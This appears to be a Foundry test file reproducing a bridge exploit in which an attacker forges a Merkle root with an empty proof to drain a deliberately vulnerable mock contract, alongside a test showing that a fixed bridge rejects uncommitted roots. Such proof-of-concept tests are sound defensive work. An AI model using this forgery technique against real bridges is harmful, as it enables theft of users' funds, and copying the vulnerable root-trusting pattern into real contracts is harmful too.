// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test} from "forge-std/Test.sol";
import {MockERC20} from "./mocks/MockERC20.sol";
import {IERC20, VulnerableMerkleBridge, SafeMerkleBridge} from "../src/merkle/MerkleBridge.sol";

/// PoC for the Verus bridge Merkle-proof verification flaw (~$11.6M, 2026-05-17).
///   forge test --match-contract VerusMerkleForgery -vvv
///
/// Invariant (SC02): a cross-chain withdrawal must verify against a root actually committed by the
/// authenticated source. The vulnerable bridge trusts a caller-supplied root, so an attacker forges
/// a tree with their own withdrawal; requiring an authenticated/committed root holds.
///
/// See docs/exploits/verus-bridge-merkle-2026-05-17.md
contract VerusMerkleForgeryTest is Test {
    MockERC20 token;
    address relayer = makeAddr("relayer");
    address attacker = makeAddr("attacker");
    address legitUser = makeAddr("legitUser");

    function setUp() public {
        token = new MockERC20();
    }

    function test_vulnerable_forgedRootDrains() public {
        VulnerableMerkleBridge bridge = new VulnerableMerkleBridge(IERC20(address(token)), relayer);
        token.mint(address(bridge), 100e18);

        // Attacker fabricates a single-leaf tree: leaf = keccak(attacker, 100e18), root = leaf,
        // proof = []. Nothing checks that this root was ever published by the relayer.
        bytes32 forgedLeaf = keccak256(abi.encodePacked(attacker, uint256(100e18)));
        bytes32[] memory emptyProof = new bytes32[](0);

        bridge.withdraw(attacker, 100e18, emptyProof, forgedLeaf);

        assertEq(token.balanceOf(attacker), 100e18, "attacker drained via a self-made root");
        assertEq(token.balanceOf(address(bridge)), 0, "bridge emptied");
    }

    function test_safe_onlyAuthenticatedRoot() public {
        SafeMerkleBridge bridge = new SafeMerkleBridge(IERC20(address(token)), relayer);
        token.mint(address(bridge), 100e18);

        bytes32[] memory emptyProof = new bytes32[](0);

        // The attacker's self-made root was never committed by the relayer -> rejected.
        bytes32 forgedLeaf = keccak256(abi.encodePacked(attacker, uint256(100e18)));
        vm.expectRevert(bytes("unknown root"));
        bridge.withdraw(attacker, 100e18, emptyProof, forgedLeaf);

        // Legitimate path: the relayer commits a real root for a genuine deposit, which then pays.
        bytes32 legitLeaf = keccak256(abi.encodePacked(legitUser, uint256(10e18)));
        vm.prank(relayer);
        bridge.commitRoot(legitLeaf); // single-leaf tree -> root == leaf
        bridge.withdraw(legitUser, 10e18, emptyProof, legitLeaf);

        assertEq(token.balanceOf(legitUser), 10e18, "authenticated withdrawal pays");
        assertEq(token.balanceOf(address(bridge)), 90e18, "only the real withdrawal left");
    }
}
